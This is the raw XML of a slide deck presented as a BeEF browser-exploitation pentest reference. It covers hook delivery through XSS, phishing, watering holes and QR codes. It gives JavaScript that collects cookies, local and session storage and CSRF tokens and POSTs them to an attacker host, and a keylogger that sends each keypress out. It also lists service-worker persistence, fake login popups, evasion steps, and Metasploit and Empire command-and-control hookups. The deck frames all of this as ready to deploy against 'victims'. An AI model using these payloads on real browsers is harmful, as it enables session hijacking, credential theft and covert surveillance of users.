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DM Sans" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId17"/>
      <p:bold r:id="rId18"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Libre Baskerville" panose="02000000000000000000" pitchFamily="2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0221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459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BeEF Pentest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09491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complete Browser Exploitation Framework (BeEF) penetration testing reference — from launch and hook delivery to C2 integration and live monitoring.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9399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1. BeEF Launch &amp; Config (Kali)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5170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the BeEF framework and bind it to all interfaces on port 3000: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4769763"/>
            <a:ext cx="7556421" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8938"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6268879" y="4769763"/>
            <a:ext cx="7579043" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6495693" y="4939784"/>
            <a:ext cx="712541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beef-xss -h 0.0.0.0 -p 3000 # UI: http://YOUR_IP:3000/ui/panel (beef/beef)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8936"/>
            <a:ext cx="71700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2. Hook Delivery Vectors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71343"/>
            <a:ext cx="6407944" cy="2411254"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3951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2201823"/>
            <a:ext cx="6346984" cy="680442"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8626"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F7EDD4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3827621" y="232552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XSS Payloads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3599497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Direct injection into vulnerable input fields or reflected parameters.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171343"/>
            <a:ext cx="6408063" cy="2411254"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3951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9027" y="2201823"/>
            <a:ext cx="6347103" cy="680442"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8626"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F7EDD4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10462498" y="232552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685842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Phishing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85842" y="3599497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Email or social engineering campaigns delivering the hook URL.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4809411"/>
            <a:ext cx="6407944" cy="2411254"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3951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4270" y="4839891"/>
            <a:ext cx="6346984" cy="680442"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8626"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F7EDD4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3827621" y="496359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1051084" y="57471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Waterhole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084" y="6237565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Malicious JS injected on a compromised asset visited by the target.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28548" y="4809411"/>
            <a:ext cx="6408063" cy="2411254"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3951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9027" y="4839891"/>
            <a:ext cx="6347103" cy="680442"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8626"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F7EDD4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10462498" y="496359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650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7685842" y="57471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QR Code (Mobile)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85842" y="6237565"/>
            <a:ext cx="5893475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QR code pointing to: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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https://YOUR_IP:3000/hook.js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5813" y="636746"/>
            <a:ext cx="12371308" cy="701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 Real-Time Attack Workflow (BeEF Panel)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24126" y="1671757"/>
            <a:ext cx="6578918" cy="5920978"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2730"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B88E23"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="848558" y="1893927"/>
            <a:ext cx="5956459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Phase 1: Browser Fingerprint (Immediate)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8558" y="2466856"/>
            <a:ext cx="6130052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Commands → Browser → Execute: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848558" y="3074313"/>
            <a:ext cx="6130052" cy="4268391"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2209"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="AB8116"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837367" y="3074313"/>
            <a:ext cx="6152436" cy="4268391"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 789"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="AB8116"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1061799" y="3242667"/>
            <a:ext cx="5703570" cy="3931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AB811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 {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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ua: navigator.userAgent,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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url: location.href,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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domain: document.domain,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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cookies: document.cookie,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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forms: document.forms.length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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storage: Object.keys(localStorage).length</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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+ Object.keys(sessionStorage).length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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plugins: navigator.plugins.length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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screen: screen.width+'x'+screen.height</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="175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AB811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6664" y="1893927"/>
            <a:ext cx="3969306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Phase 2: DOM &amp; API Recon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6664" y="2466856"/>
            <a:ext cx="6255544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Commands → Network → Monitor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(live XHR/fetch capture)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6664" y="3024307"/>
            <a:ext cx="6255544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Commands → DOM → Enumerate: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6664" y="3581757"/>
            <a:ext cx="6255544" cy="1662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forms &amp; inputs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CSRF tokens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 IDs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endpoints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7493"/>
            <a:ext cx="9559052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 Real-Time Attack Workflow (cont.)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93790" y="1902857"/>
            <a:ext cx="6429494" cy="5429131"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2021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1902857"/>
            <a:ext cx="91440" cy="5429131"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93767"/>
            </a:avLst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1089303" y="2129790"/>
            <a:ext cx="319182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Phase 3: Auth Extraction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89303" y="2558772"/>
            <a:ext cx="5907048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Execute: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(steals everything)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89303" y="3075742"/>
            <a:ext cx="5907048" cy="4029313"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2128"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1079183" y="3075742"/>
            <a:ext cx="5927288" cy="4029313"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 760"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1283256" y="3228737"/>
            <a:ext cx="5519142" cy="3723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let auth = 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cookies: document.cookie,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local: JSON.stringify(localStorage),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session: JSON.stringify(sessionStorage),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tokens: document.querySelectorAll('[name*=token],[name*=csrf]'),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headers: {} // from fetch monitor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fetch('http://YOUR_IP:4444/beef', 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method:'POST',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body:JSON.stringify(auth)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06997" y="1902857"/>
            <a:ext cx="6429613" cy="5429131"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2021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84137" y="1902857"/>
            <a:ext cx="91440" cy="5429131"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93767"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B88E23"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7702510" y="2129790"/>
            <a:ext cx="3531751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Phase 4: Form Exploitation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702510" y="2558772"/>
            <a:ext cx="5907167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Commands → Forms → Auto-discover → Exploit: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02510" y="2979182"/>
            <a:ext cx="5907167" cy="1433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XSS Test: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every input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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="16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IDOR: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Swap user IDs in hidden fields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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="16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CSRF PoC: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Auto-generate PoC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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="4"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="16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Keylogger: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All form submits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59073"/>
            <a:ext cx="721399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4. Killer Modules (Deploy Now)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280190" y="2106930"/>
            <a:ext cx="3556873" cy="1329214"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5734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9261" y="2296001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Persistence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469261" y="2724626"/>
            <a:ext cx="3178731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Commands → Persistence → Service Worker → Survives SPA reloads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80190" y="3581281"/>
            <a:ext cx="3556873" cy="1851660"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4116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69261" y="377035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Proxy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469261" y="4198977"/>
            <a:ext cx="3178731" cy="1044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Commands → Proxy → Intercept/modify ALL requests. Add auth headers, SSRF via fetch(), API fuzzing.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80190" y="5578078"/>
            <a:ext cx="3556873" cy="1329214"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5734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9261" y="576714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Social Engineering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469261" y="6195774"/>
            <a:ext cx="3178731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Fake login popups, Credential harvester, Phishing pages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287357" y="2088833"/>
            <a:ext cx="3556873" cy="5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Exploitation — Commands → Execute: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10287357" y="2819043"/>
            <a:ext cx="3556873" cy="2623185"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2905"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10278308" y="2819043"/>
            <a:ext cx="3574971" cy="2623185"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1038"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10459760" y="2955131"/>
            <a:ext cx="3212068" cy="2351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Prototype pollution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Object.prototype.admin=true;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DOM XSS chain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location.hash='javascript:alert(1)';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Service worker C2 beacon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navigator.serviceWorker.register('/evil-sw.js')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135"/>
            <a:ext cx="7127319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5. Live Command Arsenal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93790" y="1974890"/>
            <a:ext cx="484823" cy="484823"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667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4633" y="2015311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83281" y="2048947"/>
            <a:ext cx="335101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Full Recon (1 command)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483281" y="2615803"/>
            <a:ext cx="5703927" cy="2675930"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3382"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1472565" y="2615803"/>
            <a:ext cx="5725358" cy="2675930"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1208"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1687949" y="2777371"/>
            <a:ext cx="5294590" cy="2352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(()=&gt;{let d=document;return{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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forms:d.forms.length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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iframes:d.querySelectorAll('iframe').length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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scripts:d.scripts.length,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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cookies:d.cookie,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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referer:d.referrer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="165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}})()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443073" y="1974890"/>
            <a:ext cx="484823" cy="484823"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667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23917" y="2015311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8132564" y="204894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API Dump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132564" y="2615803"/>
            <a:ext cx="5704046" cy="659249"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13728"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED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1848" y="2615803"/>
            <a:ext cx="5725478" cy="659249"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8337233" y="2777371"/>
            <a:ext cx="529470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fetch('/api/user').then(r=&gt;r.json()).then(console.log)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93790" y="5701070"/>
            <a:ext cx="484823" cy="484823"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667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4633" y="5741491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1483281" y="577512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Session Hijack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483281" y="6341983"/>
            <a:ext cx="5703927" cy="659249"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13728"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1472565" y="6341983"/>
            <a:ext cx="5725358" cy="659249"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1687949" y="6503551"/>
            <a:ext cx="5294590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document.cookie='admin=1;path=/';location.reload()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443073" y="5701070"/>
            <a:ext cx="484823" cy="484823"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667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23917" y="5741491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8132564" y="577512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Keylogger + Exfil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8132564" y="6341983"/>
            <a:ext cx="5704046" cy="995363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9093"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8121848" y="6341983"/>
            <a:ext cx="5725478" cy="995363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3247"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8337233" y="6503551"/>
            <a:ext cx="5294709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document.onkeypress=e=&gt;fetch('http://YOUR_IP/log',{body:e.key})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3053"/>
            <a:ext cx="57729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6. Evasion &amp; Stealth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3571994"/>
            <a:ext cx="6571417" cy="2134553"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7651"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B88E23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Anti-Detection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4379952"/>
            <a:ext cx="6117788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Commands → Hide → Remove hook iframe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Commands → Fake UA → Browser impersonation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Commands → Mute → Silence alerts/popups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Mobile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379952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Commands → Touch events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Commands → Geolocation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Commands → SMS phishing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479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7. C2 Integration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2720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68224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8565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Metasploit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93790" y="4466034"/>
            <a:ext cx="4196358" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="4466034"/>
            <a:ext cx="4218980" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F0ED"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="4636056"/>
            <a:ext cx="37653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msfconsole -x "use exploit/multi/browser/beef_hook; set LHOST YOUR_IP"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216962" y="332720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368224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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5216962" y="38565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Empire/Covenant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16962" y="434697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BeEF → Commands → Execute → PowerShell stager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640133" y="332720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40133" y="368224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5" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9640133" y="38565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 C2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40133" y="434697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Hook → Channel → Persistent beacon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11724"/>
            <a:ext cx="73117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8. Monitoring Dashboard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6874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BeEF Panels (Live)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3268623"/>
            <a:ext cx="3501509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Hooked Browsers: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Count, uptime, geolocation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Logs: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All command output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Commands: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History + results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Extensions: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Keylogger, network, storage dumps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88799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Alerts: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Browser offline? Auto-rehook.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9368" y="2460665"/>
            <a:ext cx="3828217" cy="4357211"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4266"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B88E23"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10406182" y="26874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Deploy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182" y="3268623"/>
            <a:ext cx="3374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Hook.js live in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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seconds</a:t>
            </a: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First victim = instant browser pivot.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0406182" y="4249579"/>
            <a:ext cx="3374588" cy="2052518"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4642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2996" y="459366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143298" y="4533067"/>
            <a:ext cx="24106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What's your initial vector (XSS/reflected/stored)?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812</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom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Libre Baskerville</vt:lpstr>
      <vt:lpstr>DM Sans</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Libre Baskerville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2026-03-12T12:19:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-12T12:21:07Z</dcterms:modified>
</cp:coreProperties>
</file>